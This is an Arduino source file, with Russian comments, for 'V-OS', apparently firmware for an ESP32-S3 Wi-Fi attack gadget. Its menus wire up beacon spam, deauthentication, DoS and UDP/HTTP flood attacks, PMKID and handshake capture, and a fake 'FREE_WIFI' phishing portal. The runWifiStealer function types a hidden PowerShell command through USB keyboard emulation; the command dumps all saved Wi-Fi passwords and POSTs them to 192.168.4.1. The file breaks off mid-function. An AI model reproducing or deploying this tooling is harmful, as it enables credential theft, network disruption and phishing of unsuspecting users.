#include <WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "esp_wifi.h"
#include <DNSServer.h>
#include <EEPROM.h>


#include <WebServer.h>
WebServer server(80);  // Или то имя/порт, которое вы используете

// ПИНЫ ДЖОЙСТИКА
#define PIN_UP 10
#define PIN_DWN 11
#define PIN_SET 21
#define PIN_BACK 18

#define LED_PIN 48  // Стандарт для S3 DevKit (RGB) или замени на 2 для обычного LED

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define SCREEN_ADDRESS 0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#include "PowerManagement.h"
#include "AdvancedFunctions.h"
#include "WifiScanner.h"    // Сканер
#include "WifiHacking.h"    // Хакинг
#include "DosAttacks.h"     // DOS модуль
#include "RemoteControl.h"  //Сервер
#include "PmkidCapture.h"
#include "SnifferModule.h"
#include "PcapModule.h"
#include "FuzzerModule.h"
#include "DDoS.h"
#include "USB.h"
#include "USBHIDKeyboard.h"
USBHIDKeyboard Keyboard;

extern Adafruit_SSD1306 display;
extern unsigned long lastProcess;
extern unsigned long lastActivity;
extern bool isDimmed;
unsigned long lastMove = 0;
extern unsigned long lastActivity;  // Берем из PowerManagement.h
extern void runPmkidCapture();

int scanLineY = 0;               // Позиция сканирующей линии
int scanSpeed = 2;               // Скорость сканирования
bool isDimmed = false;           // Переменная яркости (чтобы не было ошибок в AdvancedFunctions)
uint8_t brightness = 150;        // Начальная яркость (0-255)
float dvdX = 10, dvdY = 10;      // Текущая позиция логотипа
float dvdDX = 1.5, dvdDY = 1.2;  // Скорость и направление (X и Y)
void runHardReset();             // Просто добавь эту строку в начало файла

DNSServer dnsServer;
String portalSSID = "Free_WiFi";

// СОСТОЯНИЯ МЕНЮ
int currentMenu = 0;  // 0-Главное, 1-Скан, 2-Атаки, 3-Настройки
int selectedItem = 0;
int bgMode = 2;                                 // 0 - Матрица, 1 - Точки, 2 - Выключен
uint8_t targetBSSID[6] = { 0, 0, 0, 0, 0, 0 };  // Массив для MAC-адреса цели
int targetChannel = 0;                          // Переменная для канала цели
unsigned int targetIP = 0xC0A80101;             // По умолчанию 192.168.1.1 (в HEX: 192=C0, 168=A8, 1=01, 1=01)
bool editBrightness = false;

int scrollOffset = 0;           // С какого пункта начинаем рисовать
const int maxVisibleItems = 4;  // Сколько строк влезает на экран

const char* mainMenu[] = {
  "SCAN MENU",    // 0
  "ATTACK MENU",  // 1
  "SNIFFER",      // 2
  "BLE SCANNER",  // 3
  "GHOST MODE",   // 4
  "SERIAL MSG",   // 5
  "SETTINGS",     // 6
  "REBOOT"        // 7
};
int mainCount = 8;

const char* scanMenu[] = { "SCAN ALL AP", "SCAN STATIONS", "HIDDEN SSID", "CHANNEL GRAPH", "BACK" };
int scanCount = 5;  // Увеличили количество пунктов

const char* attackMenu[] = { "BEACON SPAM", "RICK ROLL", "APPLE POPUP", "DEAUTH ATTACK", "AUTO SNIPER", "TARGET DOS", "TOTAL DOS", "PMKID CAPTURE", "DDoS", "BACK" };
int attackCount = 10;

// Меню настроек
const char* settingsMenu[] = { "BRIGHTNESS", "CHANGE BG", "PORTAL SSID", "PW GEN", "LED TOGGLE", "REMOTE ON", "ENCRYPT TEST", "BACK" };
int settingsCount = 8;

// Меню SNIFFER
const char* sniffMenu[] = { "PCAP SNIFF", "HANDSHAKE", "PROBE REQ", "BEACON SNIFF", "WIFI FUZZER", "TARGET FUZZ", "BACK" };
int sniffCount = 7;

const char* ddosMenu[] = { "UDP FLOOD", "HTTP FLOOD", "TCP SYN", "BACK" };
int ddosCount = 4;

// Текст для Рик-ролла
const char* rickRollSSIDs[] = {
  "01.Never gonna", "02.give you up", "03.Never gonna", "04.let you down",
  "05.Never gonna", "06.run around", "07.and desert you"
};

const char* fakeSSIDs[] = { "FREE WIFI", "HACKED", "V-OS S3", "TEST NET" };

unsigned long packetsCount = 0;


void updateDisplay(String msg) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 10);
  display.println(F("SYSTEM STATUS:"));
  display.drawFastHLine(0, 20, 128, SSD1306_WHITE);
  display.setCursor(0, 35);
  display.println(msg);
  display.display();
}

void updateClockOnly() {
  // Рисуем черный прямоугольник только поверх старых часов
  display.fillRect(98, 55, 30, 9, SSD1306_WHITE);
  drawStatusBar();    // Пишем новые часы черным
  display.display();  // Обновляем только этот кадр
}

void drawStatusBarWhite() {
  unsigned long sec = millis() / 1000;
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);  // Белый текст

  // Координаты для правого нижнего угла
  display.setCursor(98, 56);
  display.printf("%02d:%02d", (sec / 60) % 60, sec % 60);
}

void drawMenu() {
  display.clearDisplay();
  display.setTextSize(1);
  drawMenuBackground();

  // 1. ОБЪЯВЛЯЕМ ПЕРЕМЕННЫЕ ОДИН РАЗ
  const char** items;
  int count;

  // 2. ВЕРХНЯЯ ПАНЕЛЬ (Header)
  display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(35, 1);

  // 3. ОПРЕДЕЛЯЕМ КОНТЕНТ И ЗАГОЛОВОК
  if (currentMenu == 0) {
    display.print("V-OS MAIN");
    items = mainMenu;
    count = 8;
  } else if (currentMenu == 1) {
    display.print("SCANNER");
    items = scanMenu;
    count = 5;
  } else if (currentMenu == 2) {
    display.print("ATTACKS");
    items = attackMenu;
    count = 10;
  } else if (currentMenu == 4) {
    display.print("SNIFFER");
    items = sniffMenu;
    count = 7;
  } else if (currentMenu == 5) {
    display.print("!! DDoS !!");
    items = ddosMenu;
    count = 4;
  } else if (currentMenu == 3) {  // Явно указываем меню настроек
    display.print("SETTINGS");
    items = settingsMenu;
    count = 8;
  }

  // 4. ЛОГИКА СКРОЛЛА
  if (selectedItem < scrollOffset) scrollOffset = selectedItem;
  if (selectedItem >= scrollOffset + 4) scrollOffset = selectedItem - 3;

  // 5. ОТРИСОВКА ПУНКТОВ
  for (int i = 0; i < 4; i++) {
    int idx = scrollOffset + i;
    if (idx >= count) break;

    int y = 12 + (i * 10);

    // Логика выделения цветом (инверсия)
    if (idx == selectedItem) {
      display.fillRect(0, y - 1, 120, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(5, y);

    // --- ПРАВИЛЬНЫЙ ВЫВОД ТЕКСТА ---
    if (currentMenu == 3 && idx == 0) {
      // Специальный вывод только для яркости в настройках
      display.print("BRIGHT: ");
      display.print(brightness);
      if (editBrightness) display.print(" [ED]");
    } else {
      // ОБЫЧНЫЙ ВЫВОД ДЛЯ ВСЕХ ОСТАЛЬНЫХ МЕНЮ
      display.print(items[idx]);
    }
  }

  // 6. ФУТЕР
  display.drawFastHLine(0, 53, 128, SSD1306_WHITE);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(2, 56);

  if (currentMenu == 0) display.print(" SELECT");
  else display.print("< EXIT");

  drawStatusBarWhite();
  display.display();
}

String discoveredSSID = "";

void hidden_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* frame = pkt->payload;
  uint8_t frame_type = frame[0];

  // Ищем Probe Response (0x50) или Beacon (0x80)
  if (frame_type == 0x50 || frame_type == 0x80) {
    int pos = 36;              // Начало секции параметров
    if (frame[pos] == 0x00) {  // Элемент 0 — это SSID
      int ssidLen = frame[pos + 1];
      if (ssidLen > 0 && ssidLen <= 32) {
        char tempSSID[33];
        memcpy(tempSSID, &frame[pos + 2], ssidLen);
        tempSSID[ssidLen] = '\0';
        discoveredSSID = String(tempSSID);

        // Если это не пустая строка (скрытые сети шлют нули), сохраняем
        if (discoveredSSID[0] != '\0' && discoveredSSID[0] != ' ') {
          Serial.println("[FOUND HIDDEN] " + discoveredSSID);
        }
      }
    }
  }
}

void runBadUSB() {
  Keyboard.begin();
  USB.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.print("echo V-OS S3 CONNECTED");
  Keyboard.write(KEY_RETURN);
  Serial.println("HID: Payload Started");
}

void runWifiStealer() {
  Keyboard.begin();
  USB.begin();
  delay(2000);

  // Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  // Запуск PowerShell в скрытом режиме (ультра-быстро)
  // Этот скрипт: берет пароли и шлет POST запрос на 192.168.4.1/log_data
  String ps_cmd = "powershell -w h -c \"$p=netsh wlan show profiles|sls 'All User'|%{$n=$_.ToString().Split(':')[1].Trim();netsh wlan show profile name=$n key=clear|sls 'Key Content'|%{$k=$_.ToString().Split(':')[1].Trim();$n+':'+$k}};Invoke-WebRequest -Uri http://192.168.4.1 -Method Post -Body $p\"";

  Keyboard.print(ps_cmd);
  Keyboard.write(KEY_RETURN);
}

// 1. Для MAC Randomizer
void randomizeMAC() {
  uint8_t newMac[6];
  for (int i = 0; i < 6; i++) newMac[i] = random(0, 256);
  newMac[0] = (newMac[0] & 0xFE) | 0x02;  // Бит локального адреса
  esp_base_mac_addr_set(newMac);
}

// 2. Для TV-B-Gone (пустая заглушка, если нет библиотеки IRremote)
void runTVOff() {
  // Здесь будет код отправки ИК-сигнала
  Serial.println("IR: TV-OFF Sent");
}

// 3. Для Phishing Portal
void startPhishing() {
  WiFi.softAP("FREE_WIFI_VOS", "");
  dnsServer.start(53, "*", WiFi.softAPIP());
  currentMenu = 99;  // Режим портала
}

void runHiddenScan() {
  discoveredSSID = "Searching...";
  updateDisplay("Waiting for\nClient...");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&hidden_cb);

  int ch = 1;
  unsigned long lastHop = 0;

  while (digitalRead(PIN_BACK) == HIGH) {
    if (millis() - lastHop > 300) {
      ch = (ch % 13) + 1;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      lastHop = millis();
    }

    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("HIDDEN SSID FINDER");
    display.drawFastHLine(0, 10, 128, SSD1306_WHITE);

    display.setCursor(0, 30);
    display.setTextSize(1);
    display.println("Last found:");
    display.setTextSize(1);
    display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);  // Инверсия для выделения
    display.println(discoveredSSID);
    display.setTextColor(SSD1306_WHITE);

    display.setCursor(0, 55);
    display.println("[BACK] to Exit");
    display.display();
    yield();
  }
  esp_wifi_set_promiscuous(false);
}

void runSpam(const char** list, int size) {
  lastProcess = millis();
  WiFi.mode(WIFI_AP);
  while (digitalRead(PIN_BACK) == HIGH) {
    for (int i = 0; i < size; i++) {
      WiFi.softAP(list[i], "12345678");
      updateDisplay("Spamming:\n" + String(list[i]));
      if (digitalRead(PIN_BACK) == LOW) break;
      delay(200);
    }
  }
  WiFi.softAPdisconnect(true);
}

// Переменные для хранения найденных станций
String foundStations[10];
int stationsCount = 0;


void runChannelGraph() {
  updateDisplay("Analyzing...\nChannels 1-13");
  int channels[14] = { 0 };  // Массив для подсчета сетей на каналах

  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();

  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13) channels[ch]++;
  }

  while (digitalRead(PIN_BACK) == HIGH) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(20, 0);
    display.println("CHANNEL LOAD");
    display.drawFastHLine(0, 9, 128, SSD1306_WHITE);

    // Рисуем график
    for (int i = 1; i <= 13; i++) {
      int x = (i * 9) - 5;      // Позиция X для столбика
      int h = channels[i] * 8;  // Высота (8 пикселей за каждую сеть)
      if (h > 45) h = 45;       // Ограничение по высоте экрана

      display.fillRect(x, 60 - h, 6, h, SSD1306_WHITE);  // Столбик
      display.setCursor(x, 52 - h);
      if (channels[i] > 0) display.print(channels[i]);  // Число сверху

      display.setCursor(x, 60);  // Подпись канала внизу
      if (i % 2 != 0) display.print(i);
    }

    display.display();
    if (digitalRead(PIN_SET) == LOW) {  // Пересканировать по кнопке SET
      runChannelGraph();
      return;
    }
  }
}

void runRickRoll() {
  updateDisplay("RickRolling...\n[BACK] to stop");
  WiFi.mode(WIFI_AP);

  while (digitalRead(PIN_BACK) == HIGH) {
    for (int i = 0; i < 7; i++) {
      WiFi.softAP(rickRollSSIDs[i], "12345678");

      // Мигаем светодиодом при каждой смене фразы
      digitalWrite(LED_PIN, HIGH);
      delay(300);
      digitalWrite(LED_PIN, LOW);

      if (digitalRead(PIN_BACK) == LOW) break;
    }
  }
  WiFi.softAPdisconnect(true);
}

void drawLoadingAnim(String title) {
  Serial.print("[ V-OS ] " + title + ": ");  // Лог старта процесса на ПК

  for (int i = 0; i <= 10; i++) {
    display.clearDisplay();
    drawMenuBackground();  // Оставляем Cyber Scan на фоне загрузки

    // ИНВЕРСНЫЙ ЗАГОЛОВОК (Стиль V-OS)
    display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(10, 1);
    display.print("EXECUTING: " + title);

    // ПРОГРЕСС-БАР
    display.setTextColor(SSD1306_WHITE);
    display.drawRect(14, 30, 100, 10, SSD1306_WHITE);
    display.fillRect(14, 30, i * 10, 10, SSD1306_WHITE);

    // ВЫВОД ПРОЦЕНТОВ (Терминальный стиль)
    display.setCursor(50, 45);
    display.print(String(i * 10) + "%");

    // ОТЧЕТ НА ПК
    Serial.print(".");

    display.display();
    delay(70);
  }

  Serial.println(" [ DONE ]");  // Лог завершения на ПК
  digitalWrite(LED_PIN, HIGH);
  delay(100);
  digitalWrite(LED_PIN, LOW);  // Мигнуть при конце
}

void drawStartupLogo() {
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);

  // Анимация появления названия
  for (int i = -20; i < 30; i += 5) {
    display.clearDisplay();
    display.setCursor(35, i);
    display.print("V-OS");
    display.display();
    delay(30);
  }

  delay(500);

  // Эффект "Глитча" (бегающие полоски)
  for (int i = 0; i < 15; i++) {
    display.invertDisplay(i % 2);
    delay(50);
  }
  display.invertDisplay(false);

  const char* logs[] = {
    "> Mounting FS...", "> EEPROM: OK [CRC checked]", "> Loading WiFi...", "> Starting Sniffer...",
    "> Loading database", "> OK...", "> Check Entropy...",
    "> Generating RSA...", "> Patching Kernel...", "> Loading drivers...",
    "> Injecting firmware...", "> Search hardware...", "> ESP32-S3 detect",
    "> Tuning antenna...", "> SSID enabled", "> MAC spoofing...",
    "> Checking memory...", "> RAM: 512KB OK", "> PSRAM: 8MB OK",
    "> Syncing RTC...", "> Starting Web-UI...", "> PORT: 80 active",
    "> Firewall: bypass", "> Hacking networks...", "> Handshake capture...",
    "> Dictionary loaded", "> Brute-forcing...",
    "> Password found!", "> Cracking PMKID...", "> Success...",
    "> Starting GUI...", "> V-OS loaded", "> System Ready!"
  };

  int totalLogs = sizeof(logs) / sizeof(logs[0]);
  display.clearDisplay();
  display.setTextSize(1);

  for (int i = 0; i < totalLogs; i++) {
    // 1. УМНАЯ ОЧИСТКА ТЕКСТА
    if (i % 5 == 0) {
      display.fillRect(0, 0, 128, 51, SSD1306_BLACK);  // Чистим только зону логов
    }

    // 2. ОТРИСОВКА ЛОГА
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, (i % 5) * 10);
    display.print(logs[i]);

    // 3. РАСЧЕТ ПРОГРЕССА
    int progress = map(i, 0, totalLogs - 1, 0, 100);

    // 4. ОЧИСТКА ЗОНЫ ПРОГРЕСС-БАРА (чтобы не было точек вокруг)
    display.fillRect(0, 52, 128, 12, SSD1306_BLACK);

    // 5. РИСУЕМ РАМКУ И ЗАПОЛНЕНИЕ
    display.drawRect(0, 54, 98, 8, SSD1306_WHITE);
    int barWidth = map(progress, 0, 100, 0, 94);
    display.fillRect(2, 56, barWidth, 4, SSD1306_WHITE);

    // 6. РИСУЕМ ПРОЦЕНТЫ
    display.setCursor(100, 55);
    display.print(progress);
    display.print("%");

    display.display();

    // Задержка
    delay(20 + random(50, 100));
    if (i > 25) delay(100);  // Замедление в конце
  }

  delay(200);  // Пауза на финальной строке
}

void matrixEffect() {
  int x[15];  // Позиции X для колонок
  int y[15];  // Текущие позиции Y для каждой колонки

  // Инициализация случайных стартовых позиций
  for (int i = 0; i < 15; i++) {
    x[i] = i * 9;
    y[i] = random(-64, 0);
  }

  unsigned long startTime = millis();
  while (millis() - startTime < 3000) {  // Эффект длится 3 секунды
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);

    for (int i = 0; i < 15; i++) {
      // Рисуем случайный символ
      display.setCursor(x[i], y[i]);
      display.print((char)random(33, 126));

      // Смещаем "каплю" вниз
      y[i] += 4;

      // Если ушла за экран — возвращаем наверх
      if (y[i] > 64) y[i] = -10;
    }

    display.display();
    delay(30);  // Скорость падения
  }
}

/*void drawMenuBackground() {
    // Рисуем 10 случайных "падающих" пикселей для эффекта движения
    for (int i = 0; i < 10; i++) {
      int x = random(0, 128);
      int y = random(0, 64);
      // Рисуем пиксель, если он не перекрывает основной текст (примерно)
      if (y < 10 || y > 55 || x < 5 || x > 120) { 
        display.drawPixel(x, y, SSD1306_WHITE);
      }
    }
  }*/


void drawMenuBackground() {
  if (bgMode == 2) return;  // Выключен

  if (bgMode == 0) {  // РЕЖИМ: CYBER SCAN (вместо матрицы)
    // 1. Рисуем сканирующую линию
    display.drawFastHLine(0, scanLineY, 128, SSD1306_WHITE);

    // 2. Эффект "Глитч-шума" вокруг линии
    for (int i = 0; i < 5; i++) {
      int glitchX = random(0, 128);
      int glitchY = scanLineY + random(-5, 5);
      if (glitchY > 0 && glitchY < 64) {
        display.drawPixel(glitchX, glitchY, SSD1306_WHITE);
      }
    }

    // 3. Случайные символы в углах (эффект декодирования)
    display.setTextSize(1);
    if (random(0, 10) > 7) {
      display.setCursor(110, 55);
      display.print((char)random(33, 60));
      display.setCursor(5, 55);
      display.print(random(0, 9));
    }

    // Движение линии
    scanLineY += scanSpeed;
    if (scanLineY > 64 || scanLineY < 0) scanSpeed = -scanSpeed;  // Отскок
  }

  else if (bgMode == 1) {  // РЕЖИМ: STARFIELD (Звездное небо)
    for (int i = 0; i < 12; i++) {
      display.drawPixel(random(0, 128), random(0, 64), SSD1306_WHITE);
    }
  }
}

void runPWGen() {
  lastProcess = millis();
  String chars = "abcdefghijklmnopqrstuvwxyzABC1234567890!@#$";
  String pw = "";
  for (int i = 0; i < 10; i++) pw += chars[random(chars.length())];
  while (digitalRead(PIN_BACK) == HIGH) {
    display.clearDisplay();
    display.setCursor(25, 10);
    display.print("PASSWORD:");
    display.setTextSize(2);
    display.setCursor(10, 30);
    display.print(pw);
    display.setTextSize(1);
    display.setCursor(0, 55);
    display.print("[SET] New  [BACK] Exit");
    display.display();
    if (digitalRead(PIN_SET) == LOW) {
      delay(200);
      runPWGen();
      return;
    }
  }
}

void changePortalSSID() {
  lastProcess = millis();
  const char* names[] = { "Free_WiFi", "Starbucks", "TPLinc_C53", "V-OS_Hack" };
  static int idx = 0;
  idx = (idx + 1) % 4;
  portalSSID = names[idx];
  drawLoadingAnim("SAVING SSID...");
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint32_t len = pkt->rx_ctrl.sig_len;

  pkts_count++;  // Увеличиваем счетчик для Web-монитора

  // 1. ЛОВИМ ХЭНДШЕЙКИ (Твой старый код)
  if (len > 34 && payload[32] == 0x88 && payload[33] == 0x8E) {
    eapol_found++;
    digitalWrite(LED_PIN, HIGH);
    delay(2);
    digitalWrite(LED_PIN, LOW);
  }

  // 2. ЛОВИМ НАЗВАНИЯ СЕТЕЙ (Beacon Frames - 0x80)
  if (payload[0] == 0x80) {
    int ssid_len = payload[37];  // Длина SSID в пакете
    if (ssid_len > 0 && ssid_len <= 32) {
      String ssid = "";
      for (int i = 0; i < ssid_len; i++) ssid += (char)payload[38 + i];

      // Добавляем в список для вкладки MONITOR, если сети там еще нет
      if (live_ssids.indexOf(ssid) == -1) {
        if (live_ssids.length() > 500) live_ssids = "";  // Очистка при переполнении
        live_ssids += "[" + String(current_sniffer_ch) + "] " + ssid + "\n";
        topAccessPoint = ssid;  // Обновляем последнюю найденную цель
      }
    }
  }
}


void initializeDDoS();
void encryptData(const char* message);

void initEEPROM() {
  EEPROM.begin(512);

  // Читаем яркость (ячейка 0)
  brightness = EEPROM.read(0);
  if (brightness == 255 || brightness == 0) brightness = 150;

  // Читаем режим фона (ячейка 1)
  bgMode = EEPROM.read(1);
  if (bgMode > 2) bgMode = 2;  // Если в памяти мусор, ставим "Выключен"

  updateBrightness();
}

void saveSettings() {
  EEPROM.write(0, brightness);
  EEPROM.write(1, bgMode);  // Сохраняем режим фона
  EEPROM.commit();
  Serial.println("Settings (Brightness & BG) saved to EEPROM");
}

void updateBrightness() {
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(brightness);
}

void setup() {
  Serial.begin(115200);
  Serial.setTimeout(10);

  // 1. Сначала назначаем пины I2C (8 и 9)
  Wire.begin(8, 9);
  // 2. Разгоняем шину до максимума
  Wire.setClock(800000);
  initEEPROM();  // Восстанавливаем настройки
  // 3. Один раз инициализируем дисплей
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 allocation failed"));
    for (;;)
      ;  // Остановка при ошибке
  }

  display.clearDisplay();
  display.display();



  // Красивый бутскрин V-OS
  drawStartupLogo();

  pinMode(PIN_UP, INPUT_PULLUP);
  pinMode(PIN_DWN, INPUT_PULLUP);
  pinMode(PIN_SET, INPUT_PULLUP);
  pinMode(PIN_BACK, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);

  resetPowerTimers();

  // Настройка Wi-Fi в режиме монитора для перехватов
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_ps(WIFI_PS_NONE);  // Максимальная мощность передатчика

  initializeDDoS();          // Вызываем функцию для настройки DDoS
  encryptData("V-OS INIT");  // Вызываем функцию для шифрования данных, если необходимо

  drawMenu();
}

void loop() {
  unsigned long currentMillis = millis();

  // 0. СЕКРЕТНЫЕ И СИСТЕМНЫЕ ФУНКЦИИ
  if (digitalRead(PIN_UP) == LOW && digitalRead(PIN_SET) == LOW && digitalRead(PIN_BACK) == LOW) {
    delay(2000);
    // Проверяем еще раз, что кнопки все еще зажаты
    if (digitalRead(PIN_UP) == LOW && digitalRead(PIN_SET) == LOW) {
      runHardReset();
      return;  // ОБЯЗАТЕЛЬНО: выходим из loop, чтобы не рисовалось меню
    }
  }

  if (currentMenu == 99) {
    dnsServer.processNextRequest();
  }

  // Channel Hopping для монитора
  static unsigned long lastChMillis = 0;
  if (isMonitoring && (millis() - lastChMillis > 300)) {
    lastChMillis = millis();
    current_sniffer_ch++;
    if (current_sniffer_ch > 13) current_sniffer_ch = 1;
    esp_wifi_set_channel(current_sniffer_ch, WIFI_SECOND_CHAN_NONE);
  }

  // 1. СИНХРОНИЗАЦИЯ КОЛИЧЕСТВА ПУНКТОВ
  int count = 0;
  if (currentMenu == 0) count = 8;
  else if (currentMenu == 1) count = 5;
  else if (currentMenu == 2) count = 10;
  else if (currentMenu == 3) count = 8;
  else if (currentMenu == 4) count = 7;
  else if (currentMenu == 5) count = 4;

  if (checkPowerTimers()) return;

  // 2. НАВИГАЦИЯ (UP / DWN / BACK)
  int navDelay = editBrightness ? 70 : 250;

  if (currentMillis - lastMove > navDelay) {
    // КНОПКА ВВЕРХ
    if (digitalRead(PIN_UP) == LOW) {
      if (currentMenu == 3 && selectedItem == 0 && editBrightness) {
        if (brightness < 255) brightness += 5;
        updateBrightness();
      } else {
        selectedItem = (selectedItem <= 0) ? count - 1 : selectedItem - 1;
      }
      resetPowerTimers();
      lastMove = currentMillis;
    }
    // КНОПКА ВНИЗ
    else if (digitalRead(PIN_DWN) == LOW) {
      if (currentMenu == 3 && selectedItem == 0 && editBrightness) {
        if (brightness > 5) brightness -= 5;
        updateBrightness();
      } else {
        selectedItem = (selectedItem >= count - 1) ? 0 : selectedItem + 1;
      }
      resetPowerTimers();
      lastMove = currentMillis;
    }
    // КНОПКА НАЗАД (BACK)
    else if (digitalRead(PIN_BACK) == LOW) {
      if (currentMenu != 0) {
        if (currentMenu == 99) {
          dnsServer.stop();
          WiFi.softAPdisconnect(true);
          initRemoteServer();
          currentMenu = 0;
          selectedItem = 0;
        } else if (currentMenu == 3 && editBrightness) {
          editBrightness = false;
          saveSettings();
        } else if (currentMenu == 5) {  // Из DDoS в Атаки
          currentMenu = 2;
          selectedItem = 8;
        } else {
          // Умный возврат в главное меню
          if (currentMenu == 4) selectedItem = 2;
          else if (currentMenu == 3) selectedItem = 6;
          else if (currentMenu == 2) selectedItem = 1;
          else if (currentMenu == 1) selectedItem = 0;
          currentMenu = 0;
        }
      }
      resetPowerTimers();
      delay(300);
      lastMove = currentMillis;
    }
  }

  // 3. КНОПКА ВЫБОР (SET)
  if (digitalRead(PIN_SET) == LOW) {
    resetPowerTimers();
    delay(400);
    while (digitalRead(PIN_SET) == LOW)
      ;  // Ждем отпускания

    // Эффект глитча
    for (int i = 0; i < 4; i++) {
      display.invertDisplay(i % 2);
      delay(40);
    }
    display.invertDisplay(false);

    if (currentMenu == 0) {  // --- ГЛАВНОЕ МЕНЮ ---
      if (selectedItem == 0) {
        currentMenu = 1;
        selectedItem = 0;
      } else if (selectedItem == 1) {
        currentMenu = 2;
        selectedItem = 0;
      } else if (selectedItem == 2) {
        currentMenu = 4;
        selectedItem = 0;
      } else if (selectedItem == 3) runBLEScan();
      else if (selectedItem == 4) toggleGhostMode();
      else if (selectedItem == 5) runSerialMessenger();
      else if (selectedItem == 6) {
        currentMenu = 3;
        selectedItem = 0;
      } else if (selectedItem == 7) ESP.restart();
    } else if (currentMenu == 1) {  // --- SCAN MENU ---
      if (selectedItem == 0) {
        runScanAP();
        selectTargetMenu();
      } else if (selectedItem == 1) runScanStations();
      else if (selectedItem == 2) runHiddenScan();
      else if (selectedItem == 3) runChannelGraph();
      else {
        currentMenu = 0;
        selectedItem = 0;
      }
    } else if (currentMenu == 2) {  // --- ATTACK MENU ---
      if (selectedItem == 0) runSpam(fakeSSIDs, 4);
      else if (selectedItem == 1) runRickRoll();
      else if (selectedItem == 2) runApplePopup();
      else if (selectedItem == 3) runDeauthAttack();
      else if (selectedItem == 4) runAutoSniper();
      else if (selectedItem == 5) runDosAttack(false);
      else if (selectedItem == 6) runTotalDos();
      else if (selectedItem == 7) runPmkidCapture();
      else if (selectedItem == 8) {
        currentMenu = 5;
        selectedItem = 0;
      } else {
        currentMenu = 0;
        selectedItem = 1;
      }
    } else if (currentMenu == 3) {  // --- SETTINGS MENU ---
      if (selectedItem == 0) {
        editBrightness = !editBrightness;
        if (!editBrightness) saveSettings();
      } else if (!editBrightness) {
        if (selectedItem == 1) {
          bgMode++;
          if (bgMode > 2) bgMode = 0;
          saveSettings();
        } else if (selectedItem == 2) changePortalSSID();
        else if (selectedItem == 3) runPWGen();
        else if (selectedItem == 4) digitalWrite(LED_PIN, !digitalRead(LED_PIN));
        else if (selectedItem == 5) initRemoteServer();
        else if (selectedItem == 6) {
          display.clearDisplay();
          display.setCursor(0, 0);
          display.println("Encrypted Data:");
          display.println(encryptedString("V-OS TEST"));
          display.display();
          while (digitalRead(PIN_BACK) == HIGH)
            ;
        } else {
          currentMenu = 0;
          selectedItem = 6;
        }
      }
    } else if (currentMenu == 4) {  // --- SNIFFER MENU ---
      if (selectedItem == 0) runPcapSniffer();
      else if (selectedItem == 1) runPmkidCapture();
      else if (selectedItem == 2) runScanStations();
      else if (selectedItem == 3) runSniffer();
      else if (selectedItem == 4) {
        if (confirmAction("START FUZZER?")) runWifiFuzzer();
      } else if (selectedItem == 5) {
        if (confirmAction("TARGET FUZZ?")) runDirectedFuzzer(targetBSSID, targetChannel);
      } else {
        currentMenu = 0;
        selectedItem = 2;
      }
    } else if (currentMenu == 5) {  // --- DDoS SUBMENU ---
      if (selectedItem == 0) {
        if (confirmAction("START UDP?")) sendUDPPacket(targetIP, 80);
      } else if (selectedItem == 1) {
        if (confirmAction("START HTTP?")) sendHTTPRequest(targetIP, 80);
      } else if (selectedItem == 2) {
        updateDisplay("TCP SYN...\nComing Soon");
        delay(1000);
      } else {
        currentMenu = 2;
        selectedItem = 8;
      }
    }
    lastMove = millis();
  }

  // 4. СИСТЕМНЫЕ ЗАДАЧИ (ОТРИСОВКА И СЕРВЕР)
  static unsigned long lastBgUpdate = 0;
  if (millis() - lastBgUpdate > 40) {
    drawMenu();
    lastBgUpdate = millis();
  }

  if (Serial.available() > 0) runSerialMessenger();
  server.handleClient();
}


void runHardReset() {

  while (digitalRead(PIN_UP) == LOW || digitalRead(PIN_SET) == LOW || digitalRead(PIN_BACK) == LOW)
    ;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  const char* resetLogs[] = {
    "> Accessing EEPROM...",
    "> Wiping sectors...",
    "> Clearing Brightness...",
    "> Resetting BG Mode...",
    "> Initializing Defaults...",
